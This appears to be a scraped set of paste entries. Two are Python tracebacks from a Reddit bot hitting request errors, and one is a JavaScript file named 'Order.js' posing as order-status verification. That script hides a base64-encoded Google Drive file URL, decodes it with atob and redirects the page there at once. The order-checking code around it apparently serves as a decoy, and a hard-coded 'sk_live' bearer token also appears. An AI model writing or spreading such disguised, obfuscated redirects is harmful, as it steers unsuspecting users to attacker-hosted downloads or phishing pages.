           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/home/gmktec-server/Programming/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncpraw/reddit.py"", line 570, in _objectify_request
    await self.request(
  File ""/home/gmktec-server/Programming/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncpraw/util/deprecate_args.py"", line 54, in wrapped
    return await _wrapper(*args, **kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/home/gmktec-server/Programming/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncpraw/reddit.py"", line 1061, in request
    return await self._core.request(
           ^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/home/gmktec-server/Programming/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncprawcore/sessions.py"", line 383, in request
    return await self._request_with_retries(
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/home/gmktec-server/Programming/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncprawcore/sessions.py"", line 286, in _request_with_retries
    response, saved_exception = await self._make_request(
                                ^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/home/gmktec-server/Programming/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncprawcore/sessions.py"", line 192, in _make_request
    response = await self._rate_limiter.call(
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/home/gmktec-server/Programming/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncprawcore/rate_limit.py"", line 51, in call
    response = await request_function(*args, **kwargs)
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/home/gmktec-server/Programming/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncprawcore/requestor.py"", line 80, in request
    raise RequestException(exc, args, kwargs) from None
asyncprawcore.exceptions.RequestException: error with request 
"
i136XcmE,RequestException: error with request,basedcount_bot,Python,Monday 21st of April 2025 12:45:55 AM CDT,"Traceback (most recent call last):
  File ""/home/gmktec-server/Programming/Bots/basedcount_bot/basedcount_bot.py"", line 46, in wrapper
    await func(reddit_instance, mongo_client)
  File ""/home/gmktec-server/Programming/Bots/basedcount_bot/basedcount_bot.py"", line 123, in check_mail
    async for message in reddit_instance.inbox.unread(limit=None):  # Message
  File ""/home/gmktec-server/Programming/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncpraw/models/listing/generator.py"", line 37, in __anext__
    await self._next_batch()
  File ""/home/gmktec-server/Programming/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncpraw/models/listing/generator.py"", line 90, in _next_batch
    self._listing = await self._reddit.get(self.url, params=self.params)
                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/home/gmktec-server/Programming/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncpraw/util/deprecate_args.py"", line 54, in wrapped
    return await _wrapper(*args, **kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/home/gmktec-server/Programming/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncpraw/reddit.py"", line 813, in get
    return await self._objectify_request(method=""GET"", params=params, path=path)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/home/gmktec-server/Programming/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncpraw/reddit.py"", line 570, in _objectify_request
    await self.request(
  File ""/home/gmktec-server/Programming/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncpraw/util/deprecate_args.py"", line 54, in wrapped
    return await _wrapper(*args, **kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/home/gmktec-server/Programming/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncpraw/reddit.py"", line 1061, in request
    return await self._core.request(
           ^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/home/gmktec-server/Programming/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncprawcore/sessions.py"", line 383, in request
    return await self._request_with_retries(
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/home/gmktec-server/Programming/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncprawcore/sessions.py"", line 286, in _request_with_retries
    response, saved_exception = await self._make_request(
                                ^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/home/gmktec-server/Programming/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncprawcore/sessions.py"", line 192, in _make_request
    response = await self._rate_limiter.call(
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/home/gmktec-server/Programming/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncprawcore/rate_limit.py"", line 51, in call
    response = await request_function(*args, **kwargs)
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/home/gmktec-server/Programming/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncprawcore/requestor.py"", line 80, in request
    raise RequestException(exc, args, kwargs) from None
asyncprawcore.exceptions.RequestException: error with request 
"
ZYfscHVr,Order.js,dentira,JavaScript,Monday 21st of April 2025 12:32:29 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/07697/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
